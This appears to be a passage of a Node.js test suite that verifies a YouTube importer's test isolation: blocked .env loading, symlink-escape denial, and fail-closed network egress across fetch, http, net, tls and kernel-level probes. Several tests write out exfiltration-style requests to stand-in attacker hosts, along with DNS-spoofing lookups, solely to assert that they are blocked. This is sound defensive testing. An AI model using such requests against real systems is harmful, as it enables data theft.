import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { readFileSync, writeFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, unlinkSync } from "node:fs";
import { resolve, join } from "node:path";
import { tmpdir } from "node:os";
import { createHash } from "node:crypto";
import { spawnSync, execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { createRequire, syncBuiltinESMExports } from "node:module";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import tls from "node:tls";

import {
  loadEnvConfig,
  isTestIsolationActive,
  fetchYouTubeVideoMetadata,
  registerAuthorizedTestEnvDir,
  unregisterAuthorizedTestEnvDir,
  clearAuthorizedTestEnvDirs,
} from "../scripts/youtube-api.mjs";
import { isAllowedLoopback, sanitizeForError } from "./register-ts.mjs";
import * as isolatedChildProcess from "./isolated-child-process.mjs";
import { rawSpawnSync, rawExecFileSync } from "./isolated-child-process.mjs";
import {
  checkProcNetworkIsolation,
  verifyNetworkIsolationProbes,
  buildSanitizedEnvironment,
  isPlatformIpv6Disabled,
  getPlatformIpv6Status,
} from "../scripts/run-isolated-tests.mjs";
import {
  ingestYouTubeBatch,
  safeAtomicWriteFileSync,
  createAuditBackup,
  restoreAuditBackup,
  isProtectedProductionPath,
  isProtectedAuditPath,
  setProtectedRootsForTest,
  getProtectedRootsForTest,
  setBatchFileReaderForTest,
} from "../scripts/youtube-importer.mjs";
import {
  approveReviewItem,
  approveBatch,
  rejectReviewItem,
  confirmItemFormat,
  listPendingReviewItems,
  inspectReviewItem,
} from "../scripts/review-youtube-batch.mjs";
import {
  compileYouTubeCatalog,
  CANONICAL_OUTPUT_PATH,
  isCanonicalProductionCatalog,
  isCanonicalProductionAudit,
} from "../scripts/compile-youtube-catalog.mjs";
import { edits } from "../src/data/edits.ts";

const projectRoot = fileURLToPath(new URL("../", import.meta.url));

function getFileSha256(filePath) {
  if (!existsSync(filePath)) return null;
  const content = readFileSync(filePath);
  return createHash("sha256").update(content).digest("hex");
}

function createDisposableTempDir(prefix = "lolixco-stage1-") {
  return mkdtempSync(join(tmpdir(), prefix));
}

// ============================================================================
// STAGE 1 ACCEPTANCE TEST SUITE (CONSOLIDATED & HARDENED)
// ============================================================================

test("STAGE 1 AT-1.1: Ordinary test execution never loads .env or .env.local from project root", () => {
  assert.equal(isTestIsolationActive(), true, "Test isolation must be active during test runner execution");

  const result = loadEnvConfig();
  assert.equal(result.skipped, true, "loadEnvConfig must report skipped: true when targeting project root in test mode");
  assert.equal(result.loaded, false, "loadEnvConfig must not load files when test isolation is active");
  assert.equal(result.reason, "test_isolation_active");

  assert.equal(process.env.YOUTUBE_DATA_API_KEY, undefined, "YOUTUBE_DATA_API_KEY must be sanitized from test process");
  assert.equal(
    process.env.YOUTUBE_API_KEY,
    "LOLIXCO_SYNTHETIC_TEST_KEY_HERMETIC",
    "YOUTUBE_API_KEY must use deterministic synthetic test credentials"
  );
});

test("STAGE 1 AT-1.2: Repeated loadEnvConfig() calls safely fail-closed without touching disk", () => {
  for (let i = 0; i < 5; i++) {
    const res = loadEnvConfig();
    assert.equal(res.skipped, true, `Call ${i + 1} to loadEnvConfig must be safely skipped`);
    assert.equal(res.loaded, false, `Call ${i + 1} must not load environment`);
  }
});

test("STAGE 1 AT-1.3: Isolation bypass attempts fail closed (no force bypass or programmatic disable)", () => {
  const forceResult = loadEnvConfig(projectRoot, { force: true });
  assert.equal(forceResult.skipped, true, "force: true must be ignored when targeting project root in test mode");
  assert.equal(forceResult.loaded, false, "loadEnvConfig with force: true must not load project root env files");

  assert.equal(
    // @ts-ignore
    typeof loadEnvConfig.setTestIsolation,
    "undefined",
    "setTestIsolation must not exist"
  );

  assert.equal(isTestIsolationActive(), true, "Test isolation must remain active unconditionally");
});

test("STAGE 1 AT-1.4: Canary-secret handling in disposable external environments (Never inspects real .env.local)", () => {
  const tempCanaryDir = createDisposableTempDir("lolixco-canary-");
  const canaryKey = "CANARY_STAGE1_SECRET_" + Date.now();
  const canaryValue = "canary_secret_val_" + Math.random().toString(36).slice(2);

  try {
    registerAuthorizedTestEnvDir(tempCanaryDir);
    writeFileSync(join(tempCanaryDir, ".env.local"), `${canaryKey}=${canaryValue}\n`);

    const projectRootResult = loadEnvConfig();
    assert.equal(projectRootResult.skipped, true);
    assert.equal(process.env[canaryKey], undefined, "Default loadEnvConfig must never load from arbitrary locations");

    const canaryResult = loadEnvConfig(tempCanaryDir);
    assert.equal(canaryResult.loaded, true, "Explicit disposable temp directory parser test should succeed");
    assert.equal(process.env[canaryKey], canaryValue, "Temporary canary value must be parsed when directory is explicit disposable fixture");
  } finally {
    unregisterAuthorizedTestEnvDir(tempCanaryDir);
    delete process.env[canaryKey];
    rmSync(tempCanaryDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.4b: Symlink alias to project root and unauthorized external workstation directories are strictly blocked", () => {
  const tempDir = createDisposableTempDir("lolixco-symlink-env-");
  const aliasDir = join(tempDir, "symlink-project-root");

  try {
    symlinkSync(projectRoot, aliasDir, "dir");

    const symlinkResult = loadEnvConfig(aliasDir);
    assert.equal(symlinkResult.skipped, true, "loadEnvConfig targeting symlink alias to project root must be skipped");
    assert.equal(symlinkResult.loaded, false);
    assert.equal(symlinkResult.reason, "test_isolation_active");

    const unauthorizedExternalDir = resolve("/tmp/../home/vuld0/nonexistent_or_external_dir_" + Date.now());
    const externalResult = loadEnvConfig(unauthorizedExternalDir);
    assert.equal(externalResult.skipped, true, "Arbitrary external workstation paths outside os.tmpdir must be blocked");
    assert.equal(externalResult.loaded, false);
    assert.equal(externalResult.reason, "unauthorized_test_env_directory");
  } finally {
    rmSync(tempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.4c: Strict disposable fixture directory boundary checks, prefix lookalikes, symlink-to-secret blocking, and explicit registration", () => {
  // 1. Arbitrary unrelated temporary directory under os.tmpdir() must be rejected
  const unrelatedTempDir = mkdtempSync(join(tmpdir(), "unrelated-app-temp-"));
  try {
    writeFileSync(join(unrelatedTempDir, ".env"), "LEAKED_VAR=bad_leak\n");
    const unrelatedResult = loadEnvConfig(unrelatedTempDir);
    assert.equal(unrelatedResult.skipped, true, "Arbitrary temporary directories without explicit registration must be blocked");
    assert.equal(unrelatedResult.loaded, false);
    assert.equal(unrelatedResult.reason, "unauthorized_test_env_directory");
    assert.equal(process.env.LEAKED_VAR, undefined, "Variables from unrelated temp dirs must never be loaded");
  } finally {
    rmSync(unrelatedTempDir, { recursive: true, force: true });
  }

  // 2. Temporary-directory prefix lookalikes (e.g. /tmp-lookalike) must be rejected
  const lookalikeDir = resolve(tmpdir() + "-lookalike-dir-" + Date.now());
  const lookalikeResult = loadEnvConfig(lookalikeDir);
  assert.equal(lookalikeResult.skipped, true, "Temporary directory prefix lookalikes must be blocked fail-closed");
  assert.equal(lookalikeResult.loaded, false);
  assert.equal(lookalikeResult.reason, "unauthorized_test_env_directory");

  // 3. Symlink inside an authorized fixture dir pointing to an external canary file must be explicitly denied
  const externalCanaryDir = mkdtempSync(join(tmpdir(), "canary-external-target-"));
  const externalCanaryKey = "CANARY_EXTERNAL_SECRET_" + Date.now();
  const externalCanaryFile = join(externalCanaryDir, ".env.canary");
  writeFileSync(externalCanaryFile, `${externalCanaryKey}=forbidden_external_secret_val\n`);

  const authorizedFixtureDir = mkdtempSync(join(tmpdir(), "lolixco-test-symlink-fixture-"));
  registerAuthorizedTestEnvDir(authorizedFixtureDir);
  try {
    const symlinkEnvLocal = join(authorizedFixtureDir, ".env.local");
    symlinkSync(externalCanaryFile, symlinkEnvLocal);

    const symlinkSecretResult = loadEnvConfig(authorizedFixtureDir);
    // Explicit denial: must report skipped with symlink_escape_denied
    assert.equal(symlinkSecretResult.skipped, true, "Symlink escape attempt must be skipped fail-closed");
    assert.equal(symlinkSecretResult.loaded, false, "Symlink escape attempt must not load any files");
    assert.equal(symlinkSecretResult.reason, "symlink_escape_denied", "Reason must explicitly be symlink_escape_denied");
    assert.equal(
      process.env[externalCanaryKey],
      undefined,
      "External canary secret from escaped symlink must never be loaded into process.env"
    );
  } finally {
    unregisterAuthorizedTestEnvDir(authorizedFixtureDir);
    delete process.env[externalCanaryKey];
    rmSync(authorizedFixtureDir, { recursive: true, force: true });
    rmSync(externalCanaryDir, { recursive: true, force: true });
  }

  // 4. Explicitly registered disposable fixture directory via registerAuthorizedTestEnvDir must succeed
  const customTempDir = mkdtempSync(join(tmpdir(), "custom-authorized-fixture-"));
  const customVar = "CUSTOM_AUTHORIZED_VAR_" + Date.now();
  try {
    writeFileSync(join(customTempDir, ".env"), `${customVar}=safe_custom_value\n`);
    registerAuthorizedTestEnvDir(customTempDir);
    const customResult = loadEnvConfig(customTempDir);
    assert.equal(customResult.loaded, true, "Explicitly registered disposable fixture directory must load successfully");
    assert.equal(process.env[customVar], "safe_custom_value");
  } finally {
    unregisterAuthorizedTestEnvDir(customTempDir);
    delete process.env[customVar];
    rmSync(customTempDir, { recursive: true, force: true });
  }
});

test("STAGE 1 AT-1.5: Network isolation on globalThis.fetch rejects external and malicious pseudo-loopback URLs", async () => {
  await assert.rejects(
    async () => {
      await globalThis.fetch("https://www.googleapis.com/youtube/v3/videos?id=dummyVideo1");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("FAIL-CLOSED TEST NETWORK ISOLATION"));
      return true;
    },
    "Outbound fetch to googleapis.com must fail closed"
  );

  await assert.rejects(
    async () => {
      await globalThis.fetch("http://localhost.attacker.com:8080/exfiltrate");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("localhost.attacker.com"));
      return true;
    },
    "Outbound fetch to localhost.attacker.com must be blocked fail-closed"
  );

  await assert.rejects(
    async () => {
      await globalThis.fetch("http://127.0.0.1.attacker.com/leak");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "Outbound fetch to 127.0.0.1.attacker.com must be blocked fail-closed"
  );
});

test("STAGE 1 AT-1.5b: Loopback fetch redirect to external URL is blocked fail-closed", async () => {
  const server = http.createServer((req, res) => {
    res.writeHead(302, {
      Location: "https://example.com/exfiltrated-secret",
    });
    res.end();
  });

  await new Promise((resolveServer) => {
    server.listen(0, "127.0.0.1", () => resolveServer());
  });

  const port = server.address().port;
  const loopbackUrl = `http://127.0.0.1:${port}/redirect-test`;

  try {
    await assert.rejects(
      async () => {
        await globalThis.fetch(loopbackUrl);
      },
      (err) => {
        assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
        assert.ok(err.message.includes("Loopback redirect to external URL"));
        return true;
      },
      "Fetch following redirect to external destination must fail-closed"
    );
  } finally {
    server.close();
  }
});

test("STAGE 1 AT-1.5c: Sensitive credential and query token redaction in blocked error messages", async () => {
  const sensitiveUrl = "https://api.example.com/endpoint?auth_token=super_secret_token_12345&api_key=my_key";
  try {
    await globalThis.fetch(sensitiveUrl);
    assert.fail("Should have thrown network isolation error");
  } catch (err) {
    assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
    assert.equal(err.message.includes("super_secret_token_12345"), false, "Error message must redact sensitive auth_token");
    assert.equal(err.message.includes("my_key"), false, "Error message must redact query parameter values");
  }
});

test("STAGE 1 AT-1.6: Network isolation intercepts node:http and node:https requests fail-closed", () => {
  assert.throws(
    () => {
      http.request("http://example.com/api");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTP request to 'http://example.com/api' was blocked"));
      return true;
    }
  );

  assert.throws(
    () => {
      https.request("https://www.googleapis.com/youtube/v3/videos");
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound HTTPS request"));
      return true;
    }
  );

  assert.throws(
    () => {
      http.request({ hostname: "localhost.attacker.com", port: 80 });
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    }
  );
});

test("STAGE 1 AT-1.6b: URL-plus-options host override is intercepted fail-closed", () => {
  assert.throws(
    () => {
      http.request(new URL("http://localhost:3000/path"), {
        host: "evil-attacker.com",
      });
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "Overriding host via options object must be caught and blocked"
  );

  assert.throws(
    () => {
      http.request(new URL("http://127.0.0.1:8080"), {
        hostname: "api.external.com",
      });
    },
    (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      return true;
    },
    "Overriding hostname via options object must be caught and blocked"
  );
});

test("STAGE 1 AT-1.6c: Raw TCP socket egress (node:net) is intercepted fail-closed in test mode across all argument variants", async () => {
  // 1. Socket.connect(port, host) variant
  await new Promise((resolve) => {
    const socket = new net.Socket();
    socket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound socket connection to 'example.com' was blocked"));
      resolve();
    });
    socket.connect(80, "example.com");
  });

  // 2. Socket.connect({ host, port }) variant with external IP
  await new Promise((resolve) => {
    const socketIp = new net.Socket();
    socketIp.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound socket connection to '93.184.216.34' was blocked"));
      resolve();
    });
    socketIp.connect({ host: "93.184.216.34", port: 80 });
  });

  // 3. net.connect(port, host) direct function call
  await new Promise((resolve) => {
    const directSocket = net.connect(80, "1.1.1.1");
    directSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("1.1.1.1"));
      resolve();
    });
  });

  // 4. net.createConnection({ host, port }) direct function call
  await new Promise((resolve) => {
    const directCreate = net.createConnection({ host: "api.external.com", port: 443 });
    directCreate.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("api.external.com"));
      resolve();
    });
  });

  // 5. Custom DNS lookup function override attempt must still be intercepted fail-closed
  await new Promise((resolve) => {
    const customLookupSocket = net.connect({
      host: "evil-dns-spoof.attacker.com",
      port: 80,
      lookup: (hostname, opts, cb) => cb(null, "127.0.0.1", 4), // attempt DNS spoof to loopback
    });
    customLookupSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("evil-dns-spoof.attacker.com"));
      resolve();
    });
  });
});

test("STAGE 1 AT-1.6e: TLS socket egress (node:tls) and named connect exports are intercepted fail-closed", async () => {
  // 1. tls.connect({ host, port })
  await new Promise((resolve) => {
    const tlsSocket = tls.connect({ host: "example.com", port: 443 });
    tlsSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("Outbound TLS connection to 'example.com' was blocked"));
      resolve();
    });
  });

  // 2. tls.connect(port, host)
  await new Promise((resolve) => {
    const tlsSocket = tls.connect(443, "www.googleapis.com");
    tlsSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("googleapis.com"));
      resolve();
    });
  });

  // 3. tls.connect with custom DNS lookup override attempt
  await new Promise((resolve) => {
    const tlsSocket = tls.connect({
      host: "spoofed.attacker.com",
      port: 443,
      lookup: (hostname, opts, cb) => cb(null, "127.0.0.1", 4),
    });
    tlsSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("spoofed.attacker.com"));
      resolve();
    });
  });

  // 4. Named import of tls.connect
  const { connect: namedTlsConnect } = await import("node:tls");
  await new Promise((resolve) => {
    const namedSocket = namedTlsConnect({ host: "api.github.com", port: 443 });
    namedSocket.on("error", (err) => {
      assert.equal(err.code, "ENETWORK_BLOCKED_TEST_MODE");
      assert.ok(err.message.includes("api.github.com"));
      resolve();
    });
  });
});

test("STAGE 1 AT-1.6f: Genuine OS-level kernel network boundary isolation (no JS hooks, pure native node & python)", () => {
  // 1. Pure native Node process WITHOUT --import ./tests/register-ts.mjs bootstrap
  // Tests IPv4 egress, IPv6 egress, custom DNS lookup spoofing, TLS egress, and loopback control
  const nodeKernelChild = spawnSync(process.execPath, [
    "--no-warnings",
    "-e",
    `
    import net from "node:net";
    import tls from "node:tls";
    import http from "node:http";

    const results = {};
    let pending = 5;

    function finish() {
      pending--;
      if (pending <= 0) {
        console.log("KERNEL_PROBE_JSON:" + JSON.stringify(results));
        process.exit(0);
      }
    }

    // A. External IPv4 socket to documentation IP 198.51.100.1 (RFC 5737 TEST-NET-2)
    const s4 = net.connect(80, "198.51.100.1");
    s4.on("error", (err) => {
      results.ipv4 = { code: err.code, message: err.message, deniedBy: "os_kernel" };
      finish();
    });
    s4.on("connect", () => {
      results.ipv4 = { code: "CONNECTED", deniedBy: "none" };
      s4.destroy();
      finish();
    });

    // B. External IPv6 socket to documentation IPv6 2001:db8::1 (RFC 3849)
    const s6 = net.connect(80, "2001:db8::1");
    s6.on("error", (err) => {
      results.ipv6 = { code: err.code, message: err.message, deniedBy: "os_kernel" };
      finish();
    });
    s6.on("connect", () => {
      results.ipv6 = { code: "CONNECTED", deniedBy: "none" };
      s6.destroy();
      finish();
    });

    // C. Custom DNS lookup override attempting to resolve to 198.51.100.1
    const sCustom = net.connect({
      host: "custom-dns-target.internal",
      port: 80,
      lookup: (h, o, cb) => {
        if (o && o.all) {
          cb(null, [{ address: "198.51.100.1", family: 4 }]);
        } else {
          cb(null, "198.51.100.1", 4);
        }
      },
    });
    sCustom.on("error", (err) => {
      results.customDns = { code: err.code, message: err.message, deniedBy: "os_kernel" };
      finish();
    });
    sCustom.on("connect", () => {
      results.customDns = { code: "CONNECTED", deniedBy: "none" };
      sCustom.destroy();
      finish();
    });

    // D. External TLS socket to 198.51.100.1:443
    const sTls = tls.connect(443, "198.51.100.1", { rejectUnauthorized: false });
    sTls.on("error", (err) => {
      results.tls = { code: err.code, message: err.message, deniedBy: "os_kernel" };
      finish();
    });
    sTls.on("connect", () => {
      results.tls = { code: "CONNECTED", deniedBy: "none" };
      sTls.destroy();
      finish();
    });

    // E. Positive loopback control: must succeed inside isolated network namespace
    const server = http.createServer((req, res) => res.end("OS_LOOPBACK_CONTROL_OK"));
    server.listen(0, "127.0.0.1", () => {
      const port = server.address().port;
      http.get(\`http://127.0.0.1:\${port}\`, (res) => {
        let body = "";
        res.on("data", (c) => body += c);
        res.on("end", () => {
          results.loopback = { ok: true, data: body };
          server.close(() => finish());
        });
      }).on("error", (err) => {
        results.loopback = { ok: false, error: err.code };
        server.close(() => finish());
      });
    });

    setTimeout(() => {
      console.log("KERNEL_PROBE_JSON:" + JSON.stringify(results));
      process.exit(1);
    }, 2500);
    `
  ], {
    cwd: projectRoot,
    encoding: "utf-8",
    env: {
      PATH: process.env.PATH,
      HOME: process.env.HOME,
      // Zero test isolation JS hooks or preload flags
    },
  });

  assert.equal(nodeKernelChild.status, 0, `Node kernel probe child failed: ${nodeKernelChild.stderr}`);
  const nodeMatch = nodeKernelChild.stdout.match(/KERNEL_PROBE_JSON:(.+)/);
  assert.ok(nodeMatch, "Node probe must emit KERNEL_PROBE_JSON");
  const nodeResults = JSON.parse(nodeMatch[1]);

  // Assert denials originate strictly from OS kernel boundary (ENETUNREACH), NOT JavaScript hooks
  assert.notEqual(nodeResults.ipv4.code, "ENETWORK_BLOCKED_TEST_MODE", "OS kernel probe must not be intercepted by JS hook");
  assert.equal(nodeResults.ipv4.code, "ENETUNREACH", `Outbound IPv4 socket must be denied strictly with ENETUNREACH (got ${nodeResults.ipv4.code})`);
  assert.notEqual(nodeResults.ipv6.code, "ENETWORK_BLOCKED_TEST_MODE", "OS kernel probe must not be intercepted by JS hook");
  assert.equal(nodeResults.ipv6.code, "ENETUNREACH", `Outbound IPv6 socket must be denied strictly with ENETUNREACH (got ${nodeResults.ipv6.code})`);
  assert.equal(nodeResults.customDns.code, "ENETUNREACH", `Custom DNS socket to external IP must be denied strictly with ENETUNREACH (got ${nodeResults.customDns.code})`);
  assert.equal(nodeResults.tls.code, "ENETUNREACH", `Native TLS socket to external IP must be denied strictly with ENETUNREACH (got ${nodeResults.tls.code})`);
  assert.equal(nodeResults.loopback.ok, true, "Loopback control connection must succeed inside isolated namespace");
  assert.equal(nodeResults.loopback.data, "OS_LOOPBACK_CONTROL_OK", "Loopback data must match expected payload");

  // 2. Descendant process isolation: Child Node spawns grandchild Node
  const descendantChild = spawnSync(process.execPath, [
    "--no-warnings",
    "-e",
    `
    import { spawnSync } from "node:child_process";
    const grandchild = spawnSync(process.execPath, ["-e", \`
      import net from "node:net";
      const s = net.connect(80, "198.51.100.1");
      s.on("error", (e) => {
        console.log("GRANDCHILD_ERR:" + e.code);
        process.exit(0);
      });
      s.on("connect", () => {
        console.log("GRANDCHILD_CONNECTED");
        s.destroy();
        process.exit(1);
      });
    \`], { encoding: "utf-8" });
    console.log(grandchild.stdout);
    process.exit(grandchild.status ?? 0);
    `
  ], {
    cwd: projectRoot,
    encoding: "utf-8",
  });
  assert.equal(descendantChild.status, 0, `Descendant process should execute cleanly: ${descendantChild.stderr}`);
  assert.ok(
    descendantChild.stdout.includes("GRANDCHILD_ERR:ENETUNREACH"),
    "Descendant grandchild process must be denied outbound networking strictly with ENETUNREACH by OS kernel"
  );

  // 3. Independent external executable probe (Python 3 without Node.js runtime)
  const pythonChild = spawnSync("python3", [
    "-c",
    `
import socket, sys, json

results = {}

# External IPv4 egress
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(0.5)
try:
    s.connect(("198.51.100.1", 80))
    results["ipv4"] = {"denied": False, "code": "CONNECTED"}
except OSError as e:
    results["ipv4"] = {"denied": True, "errno": e.errno, "strerror": e.strerror}

# External IPv6 egress
s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
s6.settimeout(0.5)
try:
    s6.connect(("2001:db8::1", 80))
    results["ipv6"] = {"denied": False, "code": "CONNECTED"}
except OSError as e:
    results["ipv6"] = {"denied": True, "errno": e.errno, "strerror": e.strerror}

# Positive loopback control
try:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cli.connect(("127.0.0.1", port))
    conn, _ = srv.accept()
    conn.sendall(b"PY_LOOPBACK_VERIFIED")
    received = cli.recv(64)
    results["loopback"] = {"ok": True, "data": received.decode()}
    cli.close()
    conn.close()
    srv.close()
except Exception as e:
    results["loopback"] = {"ok": False, "error": str(e)}

print("PYTHON_KERNEL_JSON:" + json.dumps(results))
    `
  ], {
    cwd: projectRoot,
    encoding: "utf-8",
  });

  assert.equal(pythonChild.status, 0, `Python external executable probe failed: ${pythonChild.stderr}`);
  const pyMatch = pythonChild.stdout.match(/PYTHON_KERNEL_JSON:(.+)/);
  assert.ok(pyMatch, "Python probe must emit PYTHON_KERNEL_JSON");
  const pyResults = JSON.parse(pyMatch[1]);

  assert.equal(pyResults.ipv4.denied, true, "Python outbound IPv4 socket must be denied by OS kernel");
  assert.equal(pyResults.ipv4.errno, 101, `Python IPv4 denial must be errno 101 (ENETUNREACH), got: ${JSON.stringify(pyResults.ipv4)}`);
  assert.equal(pyResults.ipv6.denied, true, "Python outbound IPv6 socket must be denied by OS kernel");
  assert.equal(pyResults.ipv6.errno, 101, `Python IPv6 denial must be errno 101 (ENETUNREACH), got: ${JSON.stringify(pyResults.ipv6)}`);
  assert.equal(pyResults.loopback.ok, true, "Python loopback communication must succeed inside isolated namespace");
  assert.equal(pyResults.loopback.data, "PY_LOOPBACK_VERIFIED", "Python loopback data must match");
});

test("STAGE 1 AT-1.6g-unit: Helper function tests for buildSanitizedEnvironment and checkProcNetworkIsolation", () => {
  // 1. Missing /proc/net/dev directory fails closed
  const missingProc = checkProcNetworkIsolation("/nonexistent/proc/boundary");
  assert.equal(missingProc.isolated, false, "Missing proc dir must report isolated: false");
  assert.ok(missingProc.reason.includes("missing_proc_net_dev"), "Reason must specify missing_proc_net_dev");

  // 2. Comprehensive synthetic /proc validation tests
  const tempProc = mkdtempSync(join(tmpdir(), "lolixco-proc-test-"));
  try {
    const netDir = join(tempProc, "net");
    const sysNetIpv6Dir = join(tempProc, "sys/net/ipv6/conf/all");
    mkdirSync(netDir, { recursive: true });
    mkdirSync(sysNetIpv6Dir, { recursive: true });

    // Empty net/dev
    writeFileSync(join(netDir, "dev"), "");
    const emptyDev = checkProcNetworkIsolation(tempProc);
    assert.equal(emptyDev.isolated, false, "Empty dev must fail closed");

    // Malformed net/dev (no standard header)
    writeFileSync(join(netDir, "dev"), "random text without interface colons\nanother bad line\n");
    const malformedDev = checkProcNetworkIsolation(tempProc);
    assert.equal(malformedDev.isolated, false, "Malformed dev must fail closed");

    // Malformed counters in net/dev (not 16 digits)
    writeFileSync(
      join(netDir, "dev"),
      "Inter-|   Receive                                                |  Transmit\n face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n    lo:       0       0    0    0\n"
    );
    const badCountersDev = checkProcNetworkIsolation(tempProc);
    assert.equal(badCountersDev.isolated, false, "Dev with insufficient counters must fail closed");

    // Non-loopback interfaces in net/dev (e.g. eth0 present with 16 counters)
    const valid16Counters = " 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0";
    writeFileSync(
      join(netDir, "dev"),
      `Inter-|   Receive                                                |  Transmit\n face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n    lo:${valid16Counters}\n  eth0:${valid16Counters}\n`
    );
    const nonLoDev = checkProcNetworkIsolation(tempProc);
    assert.equal(nonLoDev.isolated, false, "Dev with eth0 must fail closed");
    assert.ok(nonLoDev.reason.includes("non_loopback_interfaces_detected"), "Must identify non-loopback interface");

    // Valid lo in dev, but missing /proc/net/route
    writeFileSync(
      join(netDir, "dev"),
      `Inter-|   Receive                                                |  Transmit\n face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed\n    lo:${valid16Counters}\n`
    );
    const missingRoute = checkProcNetworkIsolation(tempProc);
    assert.equal(missingRoute.isolated, false, "Missing route file must fail closed");

    // Malformed /proc/net/route header
    writeFileSync(join(netDir, "route"), "BadHeader\n");
    const badRouteHeader = checkProcNetworkIsolation(tempProc);
    assert.equal(badRouteHeader.isolated, false, "Bad route header must fail closed");

    // External route in /proc/net/route
    const validRouteHeader = "Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\tMTU\tWindow\tIRTT\n";
    writeFileSync(join(netDir, "route"), validRouteHeader + "eth0\t00000000\t0101A8C0\t0003\t0\t0\t100\t00000000\t0\t0\t0\n");
    const routedNet = checkProcNetworkIsolation(tempProc);
    assert.equal(routedNet.isolated, false, "Route table with external gateway must fail closed");
    assert.ok(routedNet.reason.includes("ipv4_routes_detected"), "Must identify ipv4_routes_detected");

    // Valid route table (header only, 0 routes), but missing ipv6_route when IPv6 is enabled
    // Provide if_inet6 and disable_ipv6: 0 so system indicates IPv6 is verified enabled
    writeFileSync(join(sysNetIpv6Dir, "disable_ipv6"), "0\n");
    writeFileSync(join(netDir, "if_inet6"), "00000000000000000000000000000001 01 80 10 80 lo\n");
    writeFileSync(join(netDir, "route"), validRouteHeader);
    const missingIpv6Route = checkProcNetworkIsolation(tempProc);
    assert.equal(missingIpv6Route.isolated, false, "Missing ipv6_route must fail closed when IPv6 enabled");
    assert.ok(missingIpv6Route.reason.includes("missing_proc_net_ipv6_route"), "Must identify missing ipv6_route");

    // Empty ipv6_route when IPv6 is enabled
    writeFileSync(join(netDir, "ipv6_route"), "");
    const emptyIpv6Route = checkProcNetworkIsolation(tempProc);
    assert.equal(emptyIpv6Route.isolated, false, "Empty ipv6_route without disabled evidence must fail closed");

    // Malformed fields in ipv6_route (non-hex)
    writeFileSync(join(netDir, "ipv6_route"), "NOT_HEX 00 NOT_HEX 00 NOT_HEX 00000001 00000001 00000000 00200200 lo\n");
    const malformedIpv6 = checkProcNetworkIsolation(tempProc);
    assert.equal(malformedIpv6.isolated, false, "Malformed hex in ipv6_route must fail closed");

    // Non-loopback interface in ipv6_route (e.g. eth0)
    const validHexLine = "00000000000000000000000000000000 00 00000000000000000000000000000000 00 00000000000000000000000000000000 00000001 00000001 00000000 00200200";
    writeFileSync(join(netDir, "ipv6_route"), `${validHexLine} eth0\n`);
    const nonLoIpv6Route = checkProcNetworkIsolation(tempProc);
    assert.equal(nonLoIpv6Route.isolated, false, "Non-loopback interface in ipv6_route must fail closed");

    // Fully valid isolated Linux proc evidence
    writeFileSync(join(netDir, "ipv6_route"), `${validHexLine} lo\n`);
    writeFileSync(join(netDir, "if_inet6"), "00000000000000000000000000000001 01 80 10 80 lo\n");
    const validIsolatedProc = checkProcNetworkIsolation(tempProc);
    assert.equal(validIsolatedProc.isolated, true, "Strictly valid Linux /proc evidence must report isolated: true");

    // Explicitly disabled IPv6 via platform sysctl (VERIFIED_DISABLED)
    writeFileSync(join(sysNetIpv6Dir, "disable_ipv6"), "1\n");
    rmSync(join(netDir, "if_inet6"), { force: true });
    rmSync(join(netDir, "ipv6_route"), { force: true });
    const disabledIpv6Proc = checkProcNetworkIsolation(tempProc);
    assert.equal(disabledIpv6Proc.isolated, true, "Disabled IPv6 via verified platform sysctl must be accepted");
    assert.equal(disabledIpv6Proc.ipv6Disabled, true, "Must flag ipv6Disabled: true");
    assert.equal(getPlatformIpv6Status(tempProc), "VERIFIED_DISABLED");

